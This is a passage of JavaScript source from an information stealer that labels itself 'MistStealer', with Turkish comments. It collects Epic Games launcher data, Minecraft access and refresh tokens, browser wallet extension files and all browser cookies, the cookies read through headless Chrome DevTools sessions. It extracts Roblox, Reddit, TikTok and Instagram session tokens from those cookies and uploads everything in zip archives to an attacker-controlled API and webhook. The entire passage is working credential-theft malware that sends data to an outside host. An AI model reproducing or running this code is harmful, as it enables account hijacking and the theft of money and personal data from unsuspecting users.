        const epicPath = path.join(localappdata, 'EpicGamesLauncher', 'Saved');
        const zipFileName = `${process.env.USERNAME}Epicgames.zip`;
        const zip = new AdmZip();

        if (fs.existsSync(epicPath)) {
            const epicSubfolders = ['Config', 'Data', 'Logs'];

            for (const subfolder of epicSubfolders) {
                const sourcePath = path.join(epicPath, subfolder);

                if (fs.existsSync(sourcePath)) {
                    zip.addLocalFolder(sourcePath, `EpicGames/${subfolder}`);
                    console.log(`Added ${subfolder} to ${zipFileName}`);
                } else {
                    console.log(`Subfolder ${subfolder} does not exist in the source directory.`);
                }
            }

            zip.writeZip(zipFileName);
            console.log(`${zipFileName} has been created.`);

            const webhook = `${api_url}/upload`;
            const form = new FormData();
            form.append("file", fs.createReadStream(zipFileName));
            form.append("json", JSON.stringify({ "key": key }));

            form.submit(webhook, (err, res) => {
                if (err) {
                    console.error(`Error during form submission: ${err.message}`);
                    return;
                }
                console.log(`Form submitted successfully. Status Code: ${res.statusCode}`);
                res.resume();
            });

        } else {
            console.log("Epic Games source folder not found.");
        }
    } catch (error) {
        console.error(`Error in StealEpicGames: ${error.message}`);
    }
}

async function getMinecraft() {
    const files = [
        `${process.env.USERPROFILE}\\.lunarclient\\settings\\game\\accounts.json`,
        `${process.env.APPDATA}\\.minecraft\\sklauncher\\accounts.json`,
        `${process.env.APPDATA}\\.minecraft\\launcher_accounts_microsoft_store.json`,
        `${process.env.APPDATA}\\.minecraft\\launcher_accounts.json`,
        `${process.env.APPDATA}\\.minecraft\\LabyMod\\accounts.json`,
        `${process.env.APPDATA}\\.minecraft\\usercache.json`,
        `${process.env.APPDATA}\\.minecraft\\launcher_profiles.json`
    ];

    let allAccountsFields = [];
    const zipper = new AdmZip();
    let filesAddedToZip = false;

    for (const file of files) {
        try {
            if (fs.existsSync(file)) {
                const jsonData = JSON.parse(fs.readFileSync(file, "utf-8"));

                if (file.includes("sklauncher") && jsonData.accounts) {
                    for (const accountId in jsonData.accounts) {
                        const account = jsonData.accounts[accountId];
                        allAccountsFields.push(
                            { name: "Player Info", value: account.displayName || "N/A", inline: true },
                            { name: "UUID", value: account.uuid || "N/A", inline: true },
                            { name: "Type", value: account.type || "N/A", inline: true },
                            { name: "Refresh Token", value: account.refreshToken || "Not found", inline: false },
                            { name: "Profile", value: `[Click to view Profile!](https://namemc.com/profile/${account.uuid})`, inline: true },
                            { name: "Skin", value: `[Click to view Skin!](https://crafatar.com/skins/${account.uuid})`, inline: true },
                            { name: "\u200B", value: "\u200B", inline: false }
                        );
                    }
                    continue;
                }

                if (file.includes("usercache.json")) {
                    jsonData.forEach(user => {
                        allAccountsFields.push(
                            { name: "Player Info", value: user.name || "N/A", inline: true },
                            { name: "UUID", value: user.uuid || "N/A", inline: true },
                            { name: "Expires On", value: new Date(user.expiry).toLocaleString() || "N/A", inline: false },
                            { name: "Profile", value: `[Click to view Profile!](https://namemc.com/profile/${user.uuid})`, inline: true },
                            { name: "Skin", value: `[Click to view Skin!](https://crafatar.com/skins/${user.uuid})`, inline: true },
                            { name: "\u200B", value: "\u200B", inline: false }
                        );
                    });
                    continue;
                }

                if (file.includes("launcher_profiles.json")) {
                    const profiles = jsonData.profiles || {};
                    for (const profileId in profiles) {
                        const profile = profiles[profileId];
                        allAccountsFields.push(
                            { name: "Profile ID", value: profileId, inline: true },
                            { name: "Name", value: profile.name || "N/A", inline: true },
                            { name: "Type", value: profile.type || "N/A", inline: true },
                            { name: "Created", value: profile.created || "N/A", inline: true },
                            { name: "Last Used", value: profile.lastUsed || "N/A", inline: true },
                            { name: "Last Version", value: profile.lastVersionId || "N/A", inline: true },
                            { name: "\u200B", value: "\u200B", inline: false }
                        );
                    }
                    continue;
                }

                if (file.includes("launcher_accounts.json") && jsonData.accounts) {
                    for (const accountKey of Object.keys(jsonData.accounts)) {
                        const account = jsonData.accounts[accountKey];
                        if (account.minecraftProfile && account.minecraftProfile.id) {
                            allAccountsFields.push(
                                { name: "Username", value: account.minecraftProfile.name || "N/A", inline: true },
                                { name: "UUID", value: account.minecraftProfile.id || "N/A", inline: true },
                                { name: "Access Token", value: account.accessToken || "Not found", inline: false },
                                { name: "Refresh Token", value: account.refreshToken || "Not found", inline: false },
                                { name: "\u200B", value: "\u200B", inline: false }
                            );
                        }
                    }
                }
            }
        } catch (fileError) {
            console.error(`Error reading or processing file ${file}:`, fileError);
        }
    }

    if (allAccountsFields.length > 25) {
        const accountInfoText = allAccountsFields.map(field => `${field.name}: ${field.value}`).join('\n');
        fs.writeFileSync("minecraftaccounts.txt", accountInfoText, "utf-8");
        zipper.addLocalFile("minecraftaccounts.txt");
        filesAddedToZip = true;
    } else if (allAccountsFields.length > 0) {
        const embedData = {
            embeds: [
                {
                    title: "Minecraft Accounts Summary",
                    color: 3447003,
                    fields: allAccountsFields
                }
            ]
        };

        try {
            await axios.post(`${api_url}/webhooks/${key}`, embedData);
            console.log("Webhook sent successfully.");
        } catch (err) {
            console.error("Error sending webhook:", err.message);
        }
    }

    for (const file of files) {
        if (fs.existsSync(file)) {
            zipper.addLocalFile(file);
            filesAddedToZip = true;
        }
    }

    if (filesAddedToZip) {
        zipper.writeZip(`${process.env.USERNAME}minecraftaccounts.zip`);
        const webhook = `${api_url}/upload`;
        const form = new FormData();

        form.append("file", fs.createReadStream(`${process.env.USERNAME}minecraftaccounts.zip`));
        form.append("json", JSON.stringify({ "key": key }));

        try {
            await form.submit(webhook);
            console.log("File uploaded successfully.");
        } catch (err) {
            console.error("Error uploading file:", err.message);
        }
    } else {
        console.log("No files to add to zip. Zip file not created.");
    }
}


async function gatherWalletInfo() {
  const walletDirectory = './BrowserWallets';
  let walletCount = 0;
  const walletDetails = [];
  let shouldCreateWalletDirectory = false;

  for (let [walletName, walletPath] of Object.entries(wallets)) {
    for (const [profilePath, profileName] of browserPath) {
      const extensionPath = path.join(profilePath, walletPath);

      if (fs.existsSync(extensionPath)) {
        shouldCreateWalletDirectory = true;

        const destFolder = path.join(walletDirectory, `${walletName}_${profileName}`);
        if (!fs.existsSync(destFolder)) {
          fs.mkdirSync(destFolder, { recursive: true });
        }

        fs.readdirSync(extensionPath).forEach((item) => {
          const srcPath = path.join(extensionPath, item);
          const destPath = path.join(destFolder, item);

          if (fs.lstatSync(srcPath).isDirectory()) {
            if (!fs.existsSync(destPath)) {
              fs.mkdirSync(destPath, { recursive: true });
            }
          } else {
            fs.copyFileSync(srcPath, destPath);
          }
        });

        walletCount++;
        walletDetails.push(`**${profileName}** ${walletName}`);
      }
    }
  }

  if (shouldCreateWalletDirectory && !fs.existsSync(walletDirectory)) {
    fs.mkdirSync(walletDirectory, { recursive: true });
  }

  if (walletCount > 0) {
    const message = {
      embeds: [
        {
          title: '<a:Money:1306020876915048468> Wallet Information',
          description: `Detected wallets and their corresponding profiles (Total: ${walletCount}):`,
          fields: walletDetails.map((detail) => ({
            name: '<a:GhibliCash:1306020878772994128> Wallet & Profile',
            value: detail,
            inline: true,
          })),
        },
      ],
    };

    try {
      await axios.post(`${api_url}/webhooks/${key}`, message);
      console.log('Embed successfully sent through the webhook.');
    } catch (error) {
      console.error('An error occurred while sending the embed:', error.message);
    }
  } else {
    console.log('No wallets found. No action needed.');
  }
}

const compatibleBrowsers = [
    {
        name: 'Chrome',
        executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe',
        userDataDir: PathModule.resolve(`${os.homedir()}/AppData/Local/Google/Chrome/User Data`),
        outputFileName: 'chrome_cookies.txt'
    },
    {
        name: 'Edge',
        executablePath: 'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe',
        userDataDir: PathModule.resolve(`${os.homedir()}/AppData/Local/Microsoft/Edge/User Data`),
        outputFileName: 'edge_cookies.txt'
    },
    {
        name: 'Brave',
        executablePath: 'C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe',
        userDataDir: PathModule.resolve(`${os.homedir()}/AppData/Local/BraveSoftware/Brave-Browser/User Data`),
        outputFileName: 'brave_cookies.txt'
    },
    {
        name: 'Yandex',
        executablePath: PathModule.resolve(`${os.homedir()}/AppData/Local/Yandex/YandexBrowser/Application/browser.exe`),
        userDataDir: PathModule.resolve(`${os.homedir()}/AppData/Local/Yandex/YandexBrowser/User Data`),
        outputFileName: 'yandex_cookies.txt'
    },
    {
        name: 'Opera',
        executablePath: PathModule.resolve(`${os.homedir()}/AppData/Local/Programs/Opera/opera.exe`),
        userDataDir: PathModule.resolve(`${os.homedir()}/AppData/Roaming/Opera Software/Opera Stable`),
        outputFileName: 'opera_cookies.txt'
    },
    {
        name: 'Opera GX',
        executablePath: PathModule.resolve(`${os.homedir()}/AppData/Local/Programs/Opera GX/opera.exe`),
        userDataDir: PathModule.resolve(`${os.homedir()}/AppData/Roaming/Opera Software/Opera GX Stable`),
        outputFileName: 'opera_gx_cookies.txt'
    }
];


function closeBrowser(browserPath) {
    return new Promise((resolve) => {
        const browserName = PathModule.basename(browserPath);
        exec(`taskkill /IM ${browserName} /F`, (error) => {
            if (error && !error.message.includes("not found")) {
                console.log(`Error closing browser: ${error.message}`);
            }
            resolve();
        });
    });
}

async function getCookiesAndSave(browser) {
    if (!fs.existsSync(browser.executablePath)) {
        console.log(`Browser not found at path: ${browser.executablePath}`);
        return;
    }

    const profilesDir = browser.userDataDir;
    const profileDirs = fs.readdirSync(profilesDir).filter(dir => dir.startsWith('Profile') || dir === 'Default');

    console.log('Detected profiles:', profileDirs);

    let totalCookies = 0;

    for (const profile of profileDirs) {
        try {
            const userDataDirForProfile = PathModule.join(profilesDir, profile);
            const browserInstance = await puppeteer.launch({
                headless: true,
                executablePath: browser.executablePath,
                userDataDir: profilesDir,
                args: [`--profile-directory=${profile}`, '--no-sandbox', '--disable-setuid-sandbox']
            });

            const page = await browserInstance.newPage();
            await page.goto('chrome://settings/cookies', { waitUntil: 'networkidle0' });
            const client = await page.target().createCDPSession();
            const allCookies = (await client.send('Network.getAllCookies')).cookies;

            console.log(`Profile: ${profile}, Retrieved Cookies Count: ${allCookies.length}`);

            totalCookies += allCookies.length;

            if (allCookies.length === 0) {
                console.log(`No cookies found for profile: ${profile}`);
            }

            let cookieData = '';
            allCookies.forEach(cookie => {
                const domain = cookie.domain.startsWith('.') ? cookie.domain : `.${cookie.domain}`;
                const path = cookie.path || '/';
                const secure = cookie.secure ? 'TRUE' : 'FALSE';
                const expires = cookie.expires || '0';
                cookieData += `${domain}\t${secure}\t${path}\t${secure}\t${expires}\t${cookie.name}\t${cookie.value}\n`;
            });

            const profileOutputFileName = `${browser.outputFileName.replace('.txt', `_${profile}.txt`)}`;
            fs.writeFileSync(profileOutputFileName, cookieData);
            console.log(`${profileOutputFileName} saved successfully. Cookie count: ${allCookies.length}`);

            await browserInstance.close();
        } catch (error) {
            console.error(`Error launching browser for profile ${profile}:`, error.message);
        }
    }

    return totalCookies;
}

function zipFiles(outputZipPath, files) {
    try {
        const zip = new AdmZip();

        files.forEach(file => {
            if (fs.existsSync(file) && fs.statSync(file).size > 0) {
                console.log(`Adding file to zip: ${file}`);
                zip.addLocalFile(file);
            } else {
                console.log(`Skipping empty or non-existent file: ${file}`);
            }
        });

        zip.writeZip(outputZipPath);
        console.log(`Zipped files successfully to: ${outputZipPath}`);
    } catch (err) {
        console.error('Error creating ZIP file:', err.message);
        throw err;
    }
}

async function sendToNewApi(api_url, randomString, cookieCounts) {
    const files = cookieCounts
        .filter(browser => browser.count > 0)
        .map(browser => `${browser.name} has ${browser.count} cookies`);

    const cookiesFound = files.length > 0
        ? `Found Cookies:\n${files.join('\n')}`
        : "No Cookies Found";

    const embedPayload = {
        embeds: [
            {
                title: "Cookie Report",
            description: `\`\`\`${cookiesFound}\`\`\``,
                fields: cookieCounts.map(browser => ({
                    name: browser.name,
                value: `\`\`\`${browser.count} cookies\`\`\``,
                    inline: true
                })),
                footer: {
                    text: `MistStealer`
                }
            }
        ]
    };

    try {
        const response = await axios.post(`${api_url}/webhooks/${key}`, embedPayload, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        console.log('Embed sent successfully:', response.data);
    } catch (error) {
        console.error('Error sending embed to webhook:', error.message);
    }
}

async function getCookies() {
    const cookieCounts = [];

    for (const browser of compatibleBrowsers) {
        if (!fs.existsSync(browser.userDataDir)) {
            console.log(`User data directory does not exist for ${browser.name}: ${browser.userDataDir}`);
            continue;
        }

        await closeBrowser(browser.executablePath);
        const totalCookies = await getCookiesAndSave(browser);
        cookieCounts.push({ name: browser.name, count: totalCookies });
    }

    const outputFiles = [];

    for (const browser of compatibleBrowsers) {
        const profilesDir = browser.userDataDir;
        if (!fs.existsSync(profilesDir)) {
            console.log(`Profiles directory does not exist for ${browser.name}: ${profilesDir}`);
            continue;
        }

        const profileDirs = fs
            .readdirSync(profilesDir)
            .filter((dir) => dir.startsWith('Profile') || dir === 'Default');

        profileDirs.forEach((profile) => {
            const profileOutputFileName = browser.outputFileName.replace('.txt', `_${profile}.txt`);
            outputFiles.push(profileOutputFileName);
        });
    }

    const nonEmptyFiles = outputFiles.filter((file) => {
        const exists = fs.existsSync(file);
        const size = exists ? fs.statSync(file).size : 0;
        console.log(`File: ${file}, Exists: ${exists}, Size: ${size}`);
        return exists && size > 0;
    });

    if (nonEmptyFiles.length > 0) {
        const zipFilePath = `./${process.env.USERNAME}cookies.zip`;
        zipFiles(zipFilePath, nonEmptyFiles);
        console.log('Zipped files successfully.');

        if (fs.existsSync(zipFilePath)) {
            const webhook = `${api_url}/upload`;
            const form = new FormData();

            form.append('file', fs.createReadStream(zipFilePath));
            form.append('json', JSON.stringify({ key }));

            try {
                await form.submit(webhook, (err, res) => {
                    if (err) {
                        console.error(err);
                        return;
                    }
                    console.log(`Durum kodu: ${res.statusCode}`);
                });
            } catch (error) {
                console.error(error);
            }
        } else {
            console.error(`Dosya bulunamadı: ${zipFilePath}`);
        }
    } else {
        console.log('No cookies to zip.');
    }

    await sendToNewApi(api_url, randomString, cookieCounts);
}
///


const localAppData = process.env['LOCALAPPDATA'] || 'C:\\Users\\<kullanıcı_adı>\\AppData\\Local';
const programFiles = process.env.PROGRAMFILES;
const programFilesX86 = path.join('C:', 'Program Files (x86)');

const configs = {
    "chrome": {
        bin: path.join(programFiles, 'Google', 'Chrome', 'Application', 'chrome.exe'),
        userData: path.join(localAppData, 'Google', 'Chrome', 'User Data')
    },
    "edge": {
        bin: path.join(programFilesX86, 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        userData: path.join(localAppData, 'Microsoft', 'Edge', 'User Data')
    },
    "brave": {
        bin: path.join(programFiles, 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
        userData: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data')
    },
    "yandex": {
        bin: path.join(programFiles, 'Yandex', 'YandexBrowser', 'Application', 'browser.exe'),
        userData: path.join(localAppData, 'Yandex', 'YandexBrowser', 'User Data')
    },
    "opera": {
        bin: path.join(programFiles, 'Opera', 'opera.exe'),
        userData: path.join(localAppData, 'Opera Software', 'Opera Stable')
    },
    "opera_gx": {
        bin: path.join(localAppData, 'Programs', 'Opera GX', 'opera.exe'),
        userData: path.join(localAppData, 'Opera Software', 'Opera GX Stable')
    }
};

async function fetchAllCookies() {
    async function getDefaultBrowser() {
        return new Promise((resolve, reject) => {
            exec('reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice" /v Progid', (err, stdout) => {
                if (err) return reject('Error reading default browser.');

                const browserKey = stdout.match(/Progid\s+REG_SZ\s+(\S+)/);
                if (browserKey) {
                    const browser = browserKey[1].toLowerCase();
                    if (browser.includes('chrome')) resolve('chrome');
                    else if (browser.includes('edge')) resolve('edge');
                    else if (browser.includes('yandex')) resolve('yandex');
                    else if (browser.includes('brave')) resolve('brave');
                    else if (browser.includes('opera')) resolve('opera');
                    else if (browser.includes('opera_gx')) resolve('opera_gx');
                    else resolve('chrome');
                } else {
                    resolve('chrome');
                }
            });
        });
    }

    async function startBrowserWithCDP(browser, profile) {
        const config = configs[browser];
        if (!config) throw new Error(`${browser} is not supported.`);

        const args = [
            '--remote-debugging-port=9222',
            `--user-data-dir=${config.userData}`,
            `--profile-directory=${profile}`,
            '--remote-allow-origins=*',
            '--headless'
        ];

        const process = spawn(config.bin, args);

        process.on('exit', (code) => {
            if (code !== 0) {
                exec(`taskkill /IM "${path.basename(config.bin)}" /F`, (err) => {
                    if (err) console.error(`Error terminating ${browser}:`, err);
                });
            }
        });

        return process;
    }

  async function getWebSocketUrl() {
        return new Promise((resolve, reject) => {
            http.get('http://127.0.0.1:9222/json', (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        const json = JSON.parse(data);
                        resolve(json[0].webSocketDebuggerUrl);
                    } catch (error) {
                        reject('WebSocket URL not found');
                    }
                });
            }).on('error', reject);
        });
    }

    async function getCookies(browser, profile) {
        try {
            const wsUrl = await getWebSocketUrl();
            const ws = new WebSocket(wsUrl);
            const cookieFile = `${browser}_${profile}_cookiesss.txt`;

            ws.on('open', () => {
                ws.send(JSON.stringify({ id: 1, method: 'Network.getAllCookies' }));
            });

            ws.on('message', (data) => {
                const message = JSON.parse(data);
                if (message.id === 1) {
                    const cookies = message.result.cookies;
                    const cookieData = cookies.map(cookie => {
                        return `${cookie.domain}\t${cookie.httpOnly}\t${cookie.path}\t${cookie.secure}\t${cookie.expires}\t${cookie.name}\t${cookie.value}`;
                    }).join('\n');

                    fs.writeFileSync(cookieFile, cookieData, 'utf8');
                    console.log(`Cookies saved to ${cookieFile}.`);
                    ws.close();
                }
            });

            await new Promise((resolve, reject) => {
                ws.on('close', resolve);
                ws.on('error', reject);
            });

        } catch (error) {
            console.log(`Failed to fetch cookies for ${browser} profile ${profile}:`, error);
        }
    }

    async function getProfilesAndFetchCookies(browser) {
        const config = configs[browser];
        if (!config) throw new Error(`${browser} is not supported.`);

        try {
            const userDataPath = config.userData;
            const profileDirs = [];
            for (let i = 0; i <= 50; i++) {
                const profileName = i === 0 ? 'Default' : `Profile ${i}`;
                const profilePath = path.join(userDataPath, profileName);
                if (fs.existsSync(profilePath)) profileDirs.push(profileName);
            }

            for (const profile of profileDirs) {
                console.log(`Fetching cookies for ${browser}, profile: ${profile}...`);
                const process = startBrowserWithCDP(browser, profile);
                await new Promise(resolve => setTimeout(resolve, 5000));
                await getCookies(browser, profile);

                exec(`taskkill /IM "${path.basename(config.bin)}" /F`, (err) => {
                    if (err) console.error(`Error terminating ${browser}:`, err);
                });
            }
        } catch (error) {
            console.log(`Error reading profile directories for ${browser}:`, error);
        }
    }

    const defaultBrowser = await getDefaultBrowser();
    console.log(`Default browser is: ${defaultBrowser}`);

    const browsers = ['chrome', 'edge', 'brave', 'yandex', 'opera', 'opera_gx'];
    await getProfilesAndFetchCookies(defaultBrowser);

    for (const browser of browsers) {
        if (browser !== defaultBrowser) await getProfilesAndFetchCookies(browser);
    }

    console.log("Tarayıcı çerez tarama işlemi tamamlandı.");
            zipAndUploadCookies();
}

///

async function fetchAllCookies5() {
    const configs = {
        chrome: {
            bin: path.join('C:', 'Program Files', 'Google', 'Chrome', 'Application', 'chrome.exe'),
            userData: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data')
        },
        edge: {
            bin: path.join('C:', 'Program Files (x86)', 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
            userData: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data')
        },
        brave: {
            bin: path.join('C:', 'Program Files', 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
            userData: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data')
        },
        yandex: {
            bin: path.join('C:', 'Program Files', 'Yandex', 'YandexBrowser', 'Application', 'browser.exe'),
            userData: path.join(process.env.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data')
        },
        opera: {
            bin: path.join('C:', 'Program Files', 'Opera', 'opera.exe'),
            userData: path.join(process.env.LOCALAPPDATA, 'Opera Software', 'Opera Stable')
        },
        opera_gx: {
            bin: path.join(process.env.LOCALAPPDATA, 'Programs', 'Opera GX', 'opera.exe'),
            userData: path.join(process.env.LOCALAPPDATA, 'Opera Software', 'Opera GX Stable')
        }
    };

    for (const [browserName, config] of Object.entries(configs)) {
        console.log(`Tarayıcı: ${browserName}`);

        const profiles = getProfileDirectories(config.userData);
        console.log(`Profiller bulundu: ${profiles.join(', ')}`);

        for (const profile of profiles) {
            try {
                console.log(`Profil işleniyor: ${profile}`);

                const browserInstance = await puppeteer.launch({
                    headless: true,
                    executablePath: config.bin,
                    args: [`--user-data-dir=${config.userData}`, `--profile-directory=${profile}`, '--no-sandbox', '--disable-setuid-sandbox']
                });

                const page = await browserInstance.newPage();
                await page.goto('chrome://settings/cookies', { waitUntil: 'networkidle0' });

                const client = await page.target().createCDPSession();
                const allCookies = (await client.send('Network.getAllCookies')).cookies;

                const cookieFile = `${browserName}_${profile}_cookiessss.txt`;
                const cookieData = generateNetscapeCookieFile(allCookies);

                fs.writeFileSync(cookieFile, cookieData, 'utf8');
                console.log(`Çerezler kaydedildi: ${cookieFile}`);

                await browserInstance.close();
            } catch (err) {
                console.error(`Hata oluştu: ${browserName} - ${profile}`, err);
            }
        }
    }
    console.log("Tüm çerez toplama işlemi tamamlandı.");
zipAndUploadCookies8();
}

function getProfileDirectories(userDataPath) {
    const profileDirs = [];
    for (let i = 0; i <= 50; i++) {
        const profileName = i === 0 ? 'Default' : `Profile ${i}`;
        const profilePath = path.join(userDataPath, profileName);
        if (fs.existsSync(profilePath)) profileDirs.push(profileName);
    }
    return profileDirs;
}

function generateNetscapeCookieFile(cookies) {
    const cookieLines = cookies.map(cookie => {
        return `${cookie.domain}\t${cookie.httpOnly ? 'TRUE' : 'FALSE'}\t${cookie.path}\t${cookie.secure ? 'TRUE' : 'FALSE'}\t${cookie.expires || 0}\t${cookie.name}\t${cookie.value}`;
    });
    return cookieLines.join('\n');
}

async function zipAndUploadCookies8() {
  const zip = new AdmZip();
  const currentDirectory = process.cwd();
  const files = fs.readdirSync(currentDirectory);

  files.forEach(file => {
    if (file.endsWith('_cookiessss.txt')) {
      const filePath = path.join(currentDirectory, file);
      zip.addLocalFile(filePath);
    }
  });

  const zipFileName = `${process.env.USERNAME}cleancookies8.zip`;
  const outputZipPath = path.join(currentDirectory, zipFileName);
  zip.writeZip(outputZipPath);

  try {
    const webhook = `${api_url}/upload`;
    const form = new FormData();
    form.append('file', fs.createReadStream(outputZipPath));
    form.append('json', JSON.stringify({ key }));
    await form.submit(webhook);
    console.log('File uploaded successfully.');
    extractSessionData8();
  } catch (error) {
    console.error('Error uploading to webhook:', error);
  }
}

function extractSessionData8() {
  const filesToCheck = fs.readdirSync('./').filter(file => file.endsWith('_cookiessss.txt'));

  filesToCheck.forEach((filename) => {
    const filePath = path.join('./', filename);

    if (fs.existsSync(filePath)) {
      const fileContent = fs.readFileSync(filePath, 'utf-8');

      const robloxMatch = fileContent.match(/\.ROBLOSECURITY\s+([^ \t\r\n]+)/);
      if (robloxMatch && robloxMatch[1]) {
        const robloxSecurityToken = robloxMatch[1];
        SubmitRoblox(robloxSecurityToken);
      }

      const redditMatch = fileContent.match(/\.reddit.com.*\sreddit_session\s+([^ \t\r\n]+)/);
      if (redditMatch && redditMatch[1]) {
        const redditSession = redditMatch[1];
        setRedditSession(redditSession);
      }

      const tiktokMatch = fileContent.match(/\.tiktok.com.*\ssessionid\s+([^ \t\r\n]+)/);
      if (tiktokMatch && tiktokMatch[1]) {
        const tiktokSession = tiktokMatch[1];
        stealTikTokSession(tiktokSession);
      }

      const instagramMatch = fileContent.match(/\.instagram.com.*\ssessionid\s+([^ \t\r\n]+)/);
      if (instagramMatch && instagramMatch[1]) {
        const instagramSession = instagramMatch[1];
        SubmitInstagram(instagramSession);
      }
    } else {
      console.log(`${filename} dosyası bulunamadı.`);
    }
  });
}


function extractSessionData() {
  const filesToCheck = fs.readdirSync('./').filter(file => file.endsWith('_cookies.txt'));

  filesToCheck.forEach((filename) => {
    const filePath = path.join('./', filename); // Using './' as the base directory

    if (fs.existsSync(filePath)) {
      const fileContent = fs.readFileSync(filePath, 'utf-8');

      // .ROBLOSECURITY bilgisi
      const robloxMatch = fileContent.match(/\.ROBLOSECURITY\s+([^ \t\r\n]+)/);
      if (robloxMatch && robloxMatch[1]) {
        const robloxSecurityToken = robloxMatch[1];
        SubmitRoblox(robloxSecurityToken);
      }

      // .reddit.com ve reddit_session bilgisi
      const redditMatch = fileContent.match(/\.reddit.com.*\sreddit_session\s+([^ \t\r\n]+)/);
      if (redditMatch && redditMatch[1]) {
        const redditSession = redditMatch[1];
        setRedditSession(redditSession);
      }

      // .tiktok.com ve sessionid bilgisi
      const tiktokMatch = fileContent.match(/\.tiktok.com.*\ssessionid\s+([^ \t\r\n]+)/);
      if (tiktokMatch && tiktokMatch[1]) {
        const tiktokSession = tiktokMatch[1];
        stealTikTokSession(tiktokSession);
      }

      // .instagram.com ve sessionid bilgisi
      const instagramMatch = fileContent.match(/\.instagram.com.*\ssessionid\s+([^ \t\r\n]+)/);
      if (instagramMatch && instagramMatch[1]) {
        const instagramSession = instagramMatch[1];
        SubmitInstagram(instagramSession);
      }
    } else {
      console.log(`${filename} dosyası bulunamadı.`);
    }
  });
}

async function zipAndUploadCookies() {
  const zip = new AdmZip();
  const currentDirectory = process.cwd();
  const files = fs.readdirSync(currentDirectory);

  files.forEach(file => {
    if (file.endsWith('_cookiesss.txt')) {
      const filePath = path.join(currentDirectory, file);
      zip.addLocalFile(filePath);
    }
  });

  const zipFileName = `${process.env.USERNAME}cleancookies.zip`;
  const outputZipPath = path.join(currentDirectory, zipFileName);
  zip.writeZip(outputZipPath);

  try {
    const webhook = `${api_url}/upload`;
    const form = new FormData();
    form.append('file', fs.createReadStream(outputZipPath));
    form.append('json', JSON.stringify({ key }));
    await form.submit(webhook);
    console.log('File uploaded successfully.');
    extractSessionData();
  } catch (error) {
    console.error('Error uploading to webhook:', error);
  }
}

/////

const debugPort = 1295; // Debugger portunu 1295 olarak belirledik
const programFiles1295 = process.env['ProgramFiles'];
const programFilesX861295 = process.env['ProgramFiles(x86)'];
const local1295 = process.env.LOCALAPPDATA;
const appData1295 = process.env.APPDATA;

const configs1295 = {
    "edge": {
        bin: path.join(programFilesX861295, 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        userData: path.join(local1295, 'Microsoft', 'Edge', 'User Data')
    },
    "chrome": {
        bin: path.join(programFiles1295, 'Google', 'Chrome', 'Application', 'chrome.exe'),
        userData: path.join(local1295, 'Google', 'Chrome', 'User Data')
    },
    "brave": {
        bin: path.join(programFiles1295, 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
        userData: path.join(local1295, 'BraveSoftware', 'Brave-Browser', 'User Data')
    },
    "operagx": {
        bin: path.join(local1295, 'Programs', "Opera GX", 'opera.exe'),
        userData: path.join(appData1295, 'Opera Software', 'Opera GX Stable')
    },
    "opera": {
        bin: path.join(local1295, 'Programs', "Opera", 'opera.exe'),
        userData: path.join(appData1295, 'Opera Software', 'Opera Stable')
    }
  };

  function browserExists1295(browser) {
    return fs.existsSync(configs1295[browser].bin);
  }

  async function startBrowser(browser, profileDirectory = null) {
    const config = configs[browser];
    const command = `"${config.bin}"`;
    const args = [
        `--remote-debugging-port=${debugPort}`,
        `--remote-allow-origins=*`,
        `--headless`,
        `--no-sandbox`,
        `--disable-setuid-sandbox`,
        `--user-data-dir="${config.userData}"`,
    ];
    if (profileDirectory) {
        args.push(`--profile-directory="${profileDirectory}"`);
    }
    console.log(`Starting ${browser} with profile: ${profileDirectory || 'default'}`);
    const browserProcess1295 = spawn(command, args, { shell: true });
    browserProcess1295.on('close', (code) => {
        console.log(`Browser process for ${profileDirectory || browser} exited with code ${code}`);
    });
    return browserProcess1295;
  }

  async function startOperaBrowser(profileDirectory = null) {
    const config = configs["operagx"];
    const command = `"${config.bin}"`;
    const args = [
        `--remote-debugging-port=${debugPort}`,
        `--user-data-dir="${config.userData}"`,
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-gpu',
        '--disable-software-rasterizer',
        '--disable-dev-shm-usage',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-extensions',
        '--headless',
        '--disable-popup-blocking',
        '--disable-background-networking',
        '--disable-sync',
        '--disable-translate',
        '--metrics-recording-only',
        '--password-store=basic'
    ];

    if (profileDirectory) {
        args.push(`--profile-directory="${profileDirectory}"`);
    }

    console.log(`Starting Opera GX with args:`, args.join(' '));
    const browserProcess1295 = spawn(command, args, {
        shell: true,
        stdio: 'pipe'
    });

    browserProcess1295.stderr.on('data', (data) => {
        console.log(`[OperaGX][ERROR] ${data.toString().trim()}`);
    });

    browserProcess1295.stdout.on('data', (data) => {
        console.log(`[OperaGX][OUT] ${data.toString().trim()}`);
    });

    await new Promise(resolve => setTimeout(resolve, 5000));
    return browserProcess1295;
  }

  async function getDebugWsUrl1295() {
    console.log('Attempting to get debug WebSocket URL');
    const url = `http://127.0.0.1:${debugPort}/json`;
    try {
        const response = await fetch(url);
        const data = await response.json();
        console.log('Successfully retrieved debug WebSocket URL');
        return data[0]?.webSocketDebuggerUrl || null;
    } catch (error) {
        console.log(`Error getting debug WebSocket URL: ${error}`);
        return null;
    }
  }

  async function getCookies1295(wsUrl) {
    console.log('Connecting to WebSocket for cookies');
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(wsUrl);
        ws.on('open', () => {
            console.log('WebSocket connection opened');
            ws.send(JSON.stringify({
                method: 'Network.getAllCookies',
                id: 1
            }));
        });
        ws.on('message', (data) => {
            const response = JSON.parse(data);
